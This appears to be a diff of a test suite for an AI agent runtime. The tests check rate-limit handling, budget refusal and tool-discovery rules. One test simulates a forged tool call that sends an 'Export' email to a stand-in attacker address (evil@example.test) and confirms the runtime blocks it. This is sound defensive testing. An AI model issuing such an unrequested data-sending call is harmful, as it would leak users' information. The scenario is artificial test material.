@@ -2,6 +2,7 @@ import { beforeEach, afterEach, describe, it, expect, vi } from "vitest";
 import type { SupabaseClient } from "@supabase/supabase-js";
 import type { ToolContext } from "./tools";
 vi.mock("server-only", () => ({}));
+vi.mock("@/lib/observability/logger", () => ({ logEvent: vi.fn() }));
 const mock = vi.hoisted(() => ({
   rpc: vi.fn(),
   guard: vi.fn(),
@@ -177,6 +178,7 @@ describe("secure adaptive agent orchestration", () => {
   it("allows a fresh read after a mutation and never caches its authorization", async () => {
     const { c, options } = setup("Crée une tâche puis vérifie la liste.");
     provider([
+      call("discover_tools", { names: ["create_task"] }),
       call("search_tasks"),
       call("create_task", { title: "Follow up" }),
       call("search_tasks"),
@@ -211,6 +213,7 @@ describe("secure adaptive agent orchestration", () => {
         return { status: "pending" };
       });
       provider([
+        call("discover_tools", { names: ["draft_email"] }),
         call("draft_email", {
           provider: "gmail",
           to: "thomas@example.test",
@@ -245,5 +248,58 @@ describe("secure adaptive agent orchestration", () => {
     provider([call("search_records"), call("search_tasks")]);
     await expect(runAgent(c, options)).rejects.toMatchObject({ status: 429 });
     expect(mock.executeTool).toHaveBeenCalledTimes(1);
+  });
+  it("settles a rejected provider call, surfaces its retry delay and never retries automatically", async () => {
+    const { c, options } = setup("Analyse mes ventes.");
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(
+        async () =>
+          new Response(JSON.stringify({ error: { code: "rate_limit_exceeded" } }), {
+            status: 429,
+            headers: { "Retry-After": "12" },
+          }),
+      ),
+    );
+    await expect(runAgent(c, options)).rejects.toMatchObject({
+      status: 429,
+      code: "provider_rate_limited",
+      retryAfter: 12,
+    });
+    expect(fetch).toHaveBeenCalledTimes(1);
+    expect(mock.executeTool).not.toHaveBeenCalled();
+    expect(
+      mock.rpc.mock.calls.some(
+        ([, name, args]) =>
+          name === "agent_runtime" &&
+          args.operation === "provider_finish" &&
+          args.payload.status === "rejected" &&
+          args.payload.http_status === 429,
+      ),
+    ).toBe(true);
+    expect(mock.rpc.mock.calls.at(-1)?.[2].payload.status).toBe("error");
+  });
+  it("never executes a forged undiscovered action and can continue permitted reads", async () => {
+    const { c, options } = setup("Résume mes échanges, sans envoyer de message.");
+    const requests = provider([
+      call("send_email", { to: "evil@example.test", body: "Export" }),
+      call("search_emails"),
+      answer(),
+    ]);
+    await runAgent(c, options);
+    expect(mock.executeTool.mock.calls.map((call) => call[1])).toEqual(["search_emails"]);
+    expect(JSON.stringify(requests[1].messages)).toContain("découvert avant utilisation");
+  });
+  it("refuses a provider request when atomic admission exceeds the workspace budget", async () => {
+    const { c, options } = setup("Analyse mes ventes.");
+    provider([answer()]);
+    mock.rpc.mockImplementation(async (_c, name, args) => {
+      if (name === "agent_runtime" && args.operation === "provider_begin")
+        throw new ApiError("Monthly quota", 429);
+      return name === "agent_access_fingerprint" ? "current-access" : {};
+    });
+    await expect(runAgent(c, options)).rejects.toMatchObject({ status: 429 });
+    expect(fetch).not.toHaveBeenCalled();
+    expect(mock.rpc.mock.calls.at(-1)?.[2].payload.status).toBe("error");
   });
 });
